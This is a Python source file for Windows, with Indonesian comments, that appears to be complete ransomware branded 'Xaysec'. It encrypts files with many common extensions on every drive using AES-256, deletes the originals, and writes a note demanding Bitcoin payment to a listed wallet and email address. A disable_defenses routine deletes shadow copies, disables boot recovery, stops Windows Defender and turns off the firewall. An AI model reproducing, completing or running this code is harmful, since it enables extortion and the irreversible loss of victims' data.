import os
import sys
import ctypes
from ctypes import wintypes
import hashlib
import string
import random
import threading
import subprocess
import struct
from pathlib import Path

# ------------------------- CryptoAPI AES -------------------------
advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32

PROV_RSA_AES = 24
CRYPT_VERIFYCONTEXT = 0xF0000000
CALG_AES_256 = 0x00006610
CRYPT_MODE_CBC = 1
CRYPT_EXPORTABLE = 0x00000001
PLAINTEXTKEYBLOB = 0x08
CUR_BLOB_VERSION = 2

class AES256_CBC:
    def __init__(self, key, iv):
        self.key = key
        self.iv = iv
        self.hProv = wintypes.HCRYPTPROV()
        self.hKey = wintypes.HCRYPTKEY()
        if not advapi32.CryptAcquireContextW(ctypes.byref(self.hProv), None, None, PROV_RSA_AES, CRYPT_VERIFYCONTEXT):
            raise RuntimeError("CryptAcquireContext failed")
        key_blob = self._build_plaintext_keyblob(key)
        if not advapi32.CryptImportKey(self.hProv, key_blob, len(key_blob), 0, CRYPT_EXPORTABLE, ctypes.byref(self.hKey)):
            raise RuntimeError("CryptImportKey failed")
        iv_bytes = (ctypes.c_char * 16)(*self.iv)
        if not advapi32.CryptSetKeyParam(self.hKey, 1, iv_bytes, 0):  # KP_IV
            raise RuntimeError("CryptSetKeyParam IV failed")
        mode = ctypes.c_int(CRYPT_MODE_CBC)
        if not advapi32.CryptSetKeyParam(self.hKey, 4, ctypes.byref(mode), 0):  # KP_MODE
            raise RuntimeError("CryptSetKeyParam mode failed")

    def _build_plaintext_keyblob(self, key):
        header_len = 12
        key_len = len(key)
        blob = (ctypes.c_char * (header_len + key_len))()
        struct.pack_into("<I", blob, 0, PLAINTEXTKEYBLOB)
        struct.pack_into("<I", blob, 4, CUR_BLOB_VERSION)
        struct.pack_into("<I", blob, 8, CALG_AES_256)
        ctypes.memmove(ctypes.byref(blob, header_len), key, key_len)
        return blob

    def encrypt(self, plaintext):
        buf_len = len(plaintext)
        buf = (ctypes.c_char * buf_len)(*plaintext)
        if not advapi32.CryptEncrypt(self.hKey, 0, True, 0, buf, ctypes.byref(wintypes.DWORD(buf_len)), buf_len):
            raise RuntimeError("CryptEncrypt failed")
        return bytes(buf)

    def close(self):
        if self.hKey:
            advapi32.CryptDestroyKey(self.hKey)
        if self.hProv:
            advapi32.CryptReleaseContext(self.hProv, 0)

# ------------------------- Konfigurasi -------------------------
PASSPHRASE = "xAY$ec_Ultra#Key!2024"
SALT = bytes.fromhex('3a7c9f1eb245d861e904f3a7c61b5e82')
TARGET_EXTENSIONS = {
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.txt', '.csv', '.rtf', '.odt', '.ods', '.odp',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.ico',
    '.mp3', '.wav', '.wma', '.aac', '.flac', '.ogg',
    '.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    '.db', '.sql', '.sqlite', '.mdb', '.accdb',
    '.html', '.php', '.asp', '.aspx', '.js', '.css',
    '.py', '.java', '.c', '.cpp', '.h', '.cs', '.vb',
    '.ps1', '.bat', '.cmd', '.sh',
    '.ini', '.cfg', '.conf', '.log',
    '.xml', '.json', '.yaml', '.yml', '.toml',
    '.svg', '.psd', '.ai', '.eps',
    '.iso', '.img', '.vmdk', '.vhd', '.vhdx',
}
RANSOM_NOTE = """YOUR FILES ARE ENCRYPTED
All your important data has been encrypted by Xaysec
To recover files, send 1000 USD in Bitcoin to: bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w
Email: leakserversupport@gmail.com
You will get the decryption tool after payment.
Do not try to decrypt manually or you will lose everything."""

# ------------------------- Fungsi Utama -------------------------
def derive_key(passphrase, salt):
    return hashlib.pbkdf2_hmac('sha256', passphrase.encode(), salt, 200000, dklen=32)

def encrypt_file(file_path, key):
    try:
        iv = os.urandom(16)
        with open(file_path, 'rb') as f:
            plain = f.read()
        cipher = AES256_CBC(key, iv)
        encrypted = cipher.encrypt(plain)
        cipher.close()
        # Ubah ekstensi menjadi .Xaysec saja
        new_path = file_path.with_suffix('.Xaysec')
        with open(new_path, 'wb') as f:
            f.write(iv + encrypted)
        os.remove(file_path)  # hapus asli
    except:
        pass

def should_encrypt(file_path):
    # Hanya enkripsi jika ekstensi target dan belum .Xaysec
    ext = file_path.suffix.lower()
    return ext in TARGET_EXTENSIONS and ext != '.xaysec'

def process_directory(directory, key):
    ransom_path = os.path.join(directory, "Xaysec_ReadMe.txt")
    try:
        with open(ransom_path, 'w') as f:
            f.write(RANSOM_NOTE)
    except:
        pass
    try:
        for entry in os.listdir(directory):
            full = os.path.join(directory, entry)
            if os.path.isfile(full):
                file_path = Path(full)
                if should_encrypt(file_path):
                    encrypt_file(file_path, key)
    except:
        pass

def worker(drive, key):
    for root, dirs, files in os.walk(drive):
        process_directory(root, key)

def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def disable_defenses():
    cmds = [
        'vssadmin delete shadows /all /quiet',
        'wmic shadowcopy delete',
        'bcdedit /set {default} recoveryenabled No',
        'sc stop WinDefend',
        'sc config WinDefend start= disabled',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'netsh advfirewall set allprofiles state off',
    ]
    for c in cmds:
        try:
            run_cmd(c)
        except:
            pass

def main():
    key = derive_key(PASSPHRASE, SALT)
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    disable_defenses()
    threads = []
    for drv in drives:
        t = threading.Thread(target=worker, args=(drv, key))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()